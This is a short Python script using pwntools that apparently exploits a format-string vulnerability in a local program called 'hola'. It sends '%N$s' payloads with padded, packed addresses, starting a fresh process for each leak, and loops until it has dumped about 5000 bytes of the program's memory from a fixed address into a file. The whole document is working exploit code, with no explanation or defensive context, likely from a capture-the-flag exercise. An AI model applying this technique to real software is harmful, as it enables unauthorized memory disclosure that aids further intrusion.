from pwn import *


dump = open('stack','w');

def leak(s,offset,pad,address):
  data = "%"+str(offset)+"$pBBBB" + pack(address)
  if "\n" in data:
    print " [!] newline in payload!"
    return ""
  try:
    s.sendline("%"+str(offset)+"$s"+"A"*pad + pack(address))
  except EOFError:
    raise EOFError
  try:
    data = s.recvline()
    data = data.split('Hola ')[1]
    print data
    print "[R] leaked %d bytes at %x " % (len(data.split("A"*pad)[0]),address)
  except EOFError:
    print "[X] EOFError trying to leak from %x" % address
    
    return None
  (code,junk) = data.split("A"*pad)
  return code

def leak_code(offset,pad,address,size):
  remainingSize = size
  out = bytearray("")
  while remainingSize > 0:
    try:
      r = process('hola')
      data = leak(r,offset,pad,address + size - remainingSize)
    except EOFError:
      return out
    if data == None:
      remainingSize -= 1
    else:
      out += bytearray(data)
      remainingSize -= len(data) + 1
      out += bytearray("\x00")
  return out


data = leak_code(9,4,0x0804851b,5000)
dump.write(data)

